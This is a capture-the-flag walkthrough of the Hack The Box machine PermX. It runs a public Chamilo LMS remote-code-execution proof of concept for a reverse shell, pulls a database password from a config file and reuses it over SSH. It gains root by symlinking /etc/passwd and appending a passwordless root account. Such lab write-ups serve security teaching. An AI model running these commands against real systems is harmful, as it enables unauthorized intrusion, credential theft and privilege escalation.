
[Machine](https://app.hackthebox.com/machines/PermX)


Start the machine and boot up your preferred machine.


In my case, I prefer to use my KALI machine


![[Pasted image 20240903103724.png]]



Like always, Based upon the cyber kill chain model start with initial footholding and reconnaissance.


![[Pasted image 20240903103957.png]]


There are 2 open ports.

- `SSH` & `HTTP`

Since we have two attack surfaces here. Let's check with the obvious one first which is port `80` 
(`HTTP`). Opening the IP address in a browser, I was thrown an error.

![[Pasted image 20240903110325.png]]


Here we see the address is redirecting us to `permx.htb`. So In order to work  with this we need to add the Ip address and domain name into our local dns `/etc/hosts` file

![[Pasted image 20240903111632.png]]

Now we can see that this website is some kind of E-learning platform

After perusing the pages, we can see that two things immediately emerge. we can find 2 potential vulnerabilities; one in the contact form and one in the email registration form.  
  
After a little amount of effort, we realize that these are just rabbitholes. Here, the one set of interactive buttons serves no use. I looked through the lib folder, read the javascript and CSS content, and used the dictionary search, but I didn't find anything helpful. The primary domain address doesn't seem to provide much that we can use moving forward. First, we should see if any subdomains exist.





Now I started to perform directory brute-forcing to check for any interesting files using the following cmd and result as follows

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-files.txt -u http://permx.htb/FUZZ -mc 200 -s
```

![[Pasted image 20240903130905.png]]

So Lets try subdomain brute-forcing now using the ffuf again

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.10.11.23 -H "Host: FUZZ.permx.htb" -mc 200 -s
```

Got the following 2 subdomains

![[Pasted image 20240903132847.png]]

Now, In order to check them you need to the `lms.permx.htb` into the same local dns (`etc/hosts`) file as you did for `permx.htb`

![[Pasted image 20240903133929.png]]

Now we  will be greeted with a login page of lms portal

![[Pasted image 20240903134125.png]]


When I was greeted with this page, I tried password brute-forcing and blind sqli which took 30 minutes and was complete waste of time. So , then Inspecting the page source again and big words say it is using chamilo service.

So I performed directory fuzzing on `lms.permx.htb`

![[Pasted image 20240903142954.png]]

Note: This step isn't necessary unless you had a brainfart at them time of doing the machine like me you perform directory fuzzing or if you are working with full concentration any pentester with his experience would check the **`/robots.txt`** file first.

![[Pasted image 20240903143048.png]]

Going through all the file only the `documentation` file has an interesting info 

![[Pasted image 20240903143450.png]]


Now we got to know the Chamilo version number as `1.11.X` . Doing a quick google search or looking it up in `ExploitDB` you can find the Chamilo 1.11.24 is associated with a `Remote Code Exploit`. You can learn more about this exploit from [here](https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc)

In the following github profile, you can find detailed steps on how to setup the files and run the program to get a rev shell.


First, I ran the`main.py` with scan parameter to check whether the website is vulnerable or not.

```bash
python3 main.py -u http://lms.permx.htb/ -a scan
```

Then I got a result stating that website is vulnerable to the RCE attack.

![[Pasted image 20240903145427.png]]

Now , lets create a reverse webshell. First start a listener in one terminal

![[Pasted image 20240903145733.png]]

Then use the following command to start a webshell using `main.py`

```bash
python3 main.py -u http://lms.permx.htb/ -a revshell
```

I left the name of webshell and reverse shell with default names and specified my tun0 Ip addr and the listener port as the image depicts

![[Pasted image 20240903150139.png]]

Then our listener will pick the reverse connection in a couple of seconds

![[Pasted image 20240903150337.png]]

As soon as the exploit was executed successfully, we were given the initial reverse shell with the username `www-data`.

**Note**: Sometime these rev shell will be tricky like they throw garbage characters for arrow keys and all. So you can use the following the python program to stabilize the reverse shell in such a way that even you press `Ctrl + C` it will run in background. This is the python program that stabilizes the shell.

```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='ls -lsaht --color=auto'
Ctrl + Z [Background Process]
stty raw -echo ; fg ; reset
stty columns 200 rows 200
```

From the given directory, I navigated back to the chamilo directory as it will be much easier to find important files from there.

![[Pasted image 20240903152159.png]]

Since most of these files have either nothing or too much data that is not useful. So, I wanted to find the `configuration.php` file because If I could find any files with this name, they might be very interesting because they might have db_username and db_password in them. In one of those situations, you can also see the same password on a shell user in CTFs. and utilized the following `find` command for easier operation

``` shell
find . -type f -name "configuration.php"
```

![[Pasted image 20240903152605.png]]

We discovered two `configuration.php` files. I examined the contents of both files.  
  
Upon reviewing the two files, I discovered that `app/config/configuration.php` contained some intriguing credentials, which were precisely what we were seeking. Reading the file we can get db_user and db_password.

`db_password = 03F6lY3uXAP2bkW8`   03F6lY3uXAP2bkW8

![[Pasted image 20240903155639.png]]

Now I wanted to find the shell users to check this password on possibility of re-use

![[Pasted image 20240903160425.png]]

Since `ssh` is an open port. Let's connect to it by using username `mtz`

![[Pasted image 20240903161021.png]]

After logging in , you can find the `user` flag in the directory as `user.txt`.

![[Pasted image 20240903161309.png]]



![[Pasted image 20240903161317.png]]


Now we need to perform privilege escalation. let's use general approach by using `sudo -l`

![[Pasted image 20240903161724.png]]

Through `sudo -l` , I checked to see if there were any interesting sudo-privileged files I could use to get more rights. We can use the file `/opt/acl.sh`. I learned that this file can be used to change the permissions of any file in the home directory of the `mtz` user after reading its contents with the cat tool. That being said, you can't change this file.

![[Pasted image 20240903162222.png]]


Since , this file doesn't have write permissions , I created a symlink file 

```bash
ln -s /etc/passwd /home/mtz/test
```

This way, I’ll have a file named “test” and it will be symlinked to /etc/passwd. I symlink it to passwd file just to be able to change root perms on it by using acl.sh.  

![[Pasted image 20240903163919.png]]  

 I give read and write permissions to our symlink file for mtz users using acl.sh.

```bash
sudo /opt/acl.sh mtz rw /home/mtz/test
```

  
And then, I give the permissions to root3 by using echo on the symlink file. This way, it will work for /etc/passwd as well since they are linked.


```bash
echo "root3::0:0:root3:/root:/bin/bash" >> ./test
```

  
Next, I switch the user to root3 by executing the command 
`su root3`.


![[Pasted image 20240903180318.png]]

Then change the directory to `/root` and you can find the flag there.




![[Pasted image 20240903180629.png]]







![[Pasted image 20240903180537.png]]


Thus, we are done.


![[Pasted image 20240903180758.png]]